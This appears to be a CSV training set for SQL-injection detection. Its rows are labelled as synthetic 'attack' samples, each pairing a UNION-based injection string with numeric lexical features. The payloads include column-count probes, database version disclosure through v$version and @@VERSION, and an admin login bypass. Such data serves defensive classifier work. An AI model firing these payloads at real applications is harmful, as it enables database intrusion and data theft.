id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000396,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000219,0.9464674587824345,80.73255244346177,24.267447556538222,3.8816708877459374,25.0,28.620139849231403,18.53489511307645,8.577517481153926,0.30976940242566464,0.353721795221704,0.23033969746478547,0.10616910488784592,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.4224825188460746,0.0,0.0,3.155034962307851,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000397,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000269,0.29148646029415376,113.64100264644202,29.45640105857681,4.267339861626531,37.0,42.91280211715362,17.0,16.728200529288404,0.3257140634056636,0.377452025852112,0.14965240751071032,0.147181503231514,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.728200529288405,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000398,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.5559266477870034,83.41868760832263,25.128031412483946,3.916017697215751,25.0,29.16262478335474,20.25606282496789,9.0,0.2997289212822204,0.34987474285260806,0.24249392420357216,0.10790241166159935,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.709343804161315,0.0,0.0,3.290656195838685,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000399,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.6129990323435095,80.0572250986228,25.342870849770467,3.978653397881605,25.0,26.68574169954093,20.028612549311397,8.342870849770465,0.3139168936068833,0.3333333333333333,0.24886648511449339,0.10388328794529,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.671435424885233,0.0,0.0,2.6714354248852326,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000400,attack,union," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000058,0.2332356454323232,99.69578495986025,26.057982079988353,4.074405447067272,62.11596415997671,4.115964159976709,23.347892479930128,10.11596415997671,0.6233817257554244,0.04119549658733762,0.23400111943182245,0.10142165822541557,3.0,0.0,2.0,0.0,1.0,2.057982079988354,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.057982079988355,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0579820799883544,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.057982079988355
SMOTE_000401,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000248,0.39247480025689546,45.70821906458657,21.058356187082687,4.103614550980479,14.0,19.76657525166926,4.0,7.941643812917315,0.30994018799415973,0.4280717744070084,0.08855433942690276,0.17343369817192916,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,2.941643812917315,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000402,attack,union,"-1218' union all select 2663,2663,2663,2663--",nearest_attack_euclidean,R000144,0.2863193417782909,43.70969301050751,19.258061397898498,3.944369577267513,14.0,18.967754408406005,4.0,6.741938602101501,0.32114683214049716,0.43297504898228895,0.09175623775442776,0.15412188112278613,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,2.7419386021015013,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000403,attack,union," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000035,0.6972747628474364,107.9363110971187,27.0,3.906872982497446,62.35205656311249,4.352056563112495,32.05616968933748,9.176028281556246,0.5782346966351044,0.04012036375596273,0.2966399244524345,0.08500501515649844,0.0,0.0,2.0,0.0,1.0,2.1760282815562464,0.0,2.0,0.0,0.0,1.0,5.176028281556246,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.17602828155624653,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.176028281556246
SMOTE_000404,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000096,0.27320234438819174,87.98129597099249,30.867913601933836,4.300325793592591,29.0,33.585036776793984,15.0,10.396259194198496,0.33059433765153323,0.3804871853249509,0.17099707119906893,0.1179214058244469,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.396259194198497,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000405,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000083,0.5732384368635884,96.04771328498376,24.80954265699675,3.9399140227268523,29.0,39.238170627987,15.0,12.80954265699675,0.3032930023095765,0.4067649349365491,0.15687569084978095,0.13306637190409346,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.809542656996752,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000406,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000043,0.21310182618797419,102.16989394450725,26.0,4.076334924993324,64.62742045838044,3.457526513873187,24.084946972253626,10.0,0.6325037237821237,0.03394933419320095,0.23563337850977845,0.09791356351489688,3.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000407,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000202,0.378042823771894,105.88265361334359,28.846938554662565,4.046893973977323,25.0,50.30612289067487,16.0,14.576530722668718,0.23623999098043963,0.47493377241091506,0.15119359422748135,0.13763264238116393,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.576530722668718,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000408,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R000281,0.1362869889647528,81.90028348060248,23.0,3.858821276227388,14.0,39.120226784481986,14.0,14.780056696120496,0.17105283152171225,0.4774432319876283,0.17105283152171225,0.18045110496894717,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,7.780056696120497,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000409,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,0.10071343367325584,73.11712901997447,31.0,4.337045699748335,44.0,2.0,17.0,10.117129019974467,0.6017984151819403,0.027354473417360914,0.23251302404756785,0.13833408735313082,0.0,0.0,2.0,0.0,2.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.117129019974466,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000410,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000102,0.28884235338677205,50.67513256633687,19.0,3.706996209090133,33.45432132739302,1.5152262242023262,10.779188761056146,4.926396253685382,0.6538433649336235,0.035133841115488784,0.21328696682421605,0.09773582712667167,0.9263962536853818,0.0,2.073603746314618,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.9263962536853816,2.0736037463146184,0.9263962536853818,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000411,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.027155187012905466,76.0,33.10201091918675,4.44267759997285,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000412,attack,union,-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,nearest_attack_euclidean,R000260,0.01940643952768398,80.12350132212131,27.037050396636396,4.225921370302363,37.0,16.098801057697052,17.0,10.024700264424263,0.4618653404279877,0.20082334214747544,0.21220839965610244,0.12510291776843444,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.024700264424262208,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000413,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000042,0.7214501766677123,83.0,27.54158606429401,3.93761819824193,40.0,3.729206967852999,25.729206967852996,13.541586064294007,0.4819277108433735,0.04493020443196377,0.3099904453958192,0.16315163932884347,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.270793032147004,1.0,0.0,1.0,0.27079303214700357,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000414,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.05776029190787475,50.66837923661744,21.941478688814843,4.00672289443387,26.746407651530987,8.0,10.941478688814843,4.980492896271614,0.5271168113260722,0.1583927140179126,0.21606876673977227,0.09842170791624286,0.9804928962716144,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.9804928962716144,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000011,2.348496251692117,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,1.0291187917409763,2.9708812082590237,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.2572796979352441,0.742720302064756,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000416,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000236,0.017378604046081117,79.13264115014536,27.0,4.12640394257679,29.0,24.10611292011629,15.0,11.026528230029072,0.36650895217688134,0.30458100257469833,0.18957359595355933,0.139336449294861,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.0265282300290717,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000417,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000236,0.27588065380033255,81.10564249727821,27.0,4.124649422554164,29.0,25.68451399782257,15.0,11.421128499455643,0.3578867341137631,0.3162358628531202,0.18511382798987747,0.14076357504323922,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.4211284994556426,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000418,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000017,0.7616164311416833,84.90412366611304,27.698625444628988,3.9558476365409745,42.0,3.301374555371016,25.753436388427534,13.849312722314494,0.49497709074381646,0.03870411265249024,0.3030007361078157,0.1633180604958776,3.0,1.6986254446289863,2.0,0.0,1.0,1.150687277685507,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.849312722314493,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000419,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000091,0.14715387029981128,98.07125064788764,27.785749870422475,4.144781034705026,29.0,40.8570005183101,15.0,13.214250129577527,0.2958291622408792,0.41644218964630836,0.15301508391769614,0.13471356419511632,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,6.214250129577527,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000420,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000301,0.8744864346836024,82.36573197483547,29.0,4.3017513805284775,29.0,26.69258557986837,15.0,11.673146394967093,0.3550552342438159,0.32006326957387643,0.1836492590916289,0.14123223709067875,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.673146394967093,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000421,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000287,0.14065933064011416,70.0,19.33399816646078,3.6182281500752103,14.0,40.0,4.0,12.0,0.2,0.5714285714285714,0.05714285714285715,0.17142857142857143,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000422,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.02342687706470485,59.81431006476219,19.0,3.759394622064242,14.0,31.85144805180975,4.0,9.962862012952437,0.2341211088161604,0.5324330184958166,0.06689174537604584,0.16655412731197708,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.962862012952438,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000423,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000089,0.3325194880461515,77.61262041257416,25.88063102062871,4.168264401603098,27.0,30.090096330059332,11.0,9.522524082514833,0.35092901017927036,0.3840841360838278,0.1429710782211842,0.12201577551571771,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,5.522524082514833,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000424,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000307,0.5231818244426735,105.11633630237573,28.735457962203036,3.997958028964636,29.0,46.11633630237573,15.0,15.0,0.2761852748387216,0.4381058201557043,0.14285445250278703,0.14285445250278703,2.470915924406068,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.529084075593933,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000425,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.4743450952302301,85.44268383412734,27.644268383412733,4.209212847670975,29.0,29.154147067301874,15.0,12.28853676682547,0.3405151712146647,0.3397174237374188,0.17612853683517135,0.14363886821274516,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.2885367668254686,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,union,"-2153'||  (  select 'sofs' where 4126  =  4126 union all select 4126,4126,4126,4126,4126#",nearest_attack_euclidean,R000225,0.11728421043490588,89.77108376454512,28.07710837645451,4.211260954418745,29.0,32.6168670116361,15.0,13.154216752909026,0.3233047975063207,0.362981101301801,0.16722661939982103,0.14648748179205726,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.154216752909025,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000177,0.6322355823585148,76.87494436034507,21.774988872069013,3.720706921071111,14.0,35.09995548827605,14.0,13.774988872069013,0.18282732776946178,0.45523989620615773,0.18282732776946178,0.17910544825491864,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,6.774988872069013,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
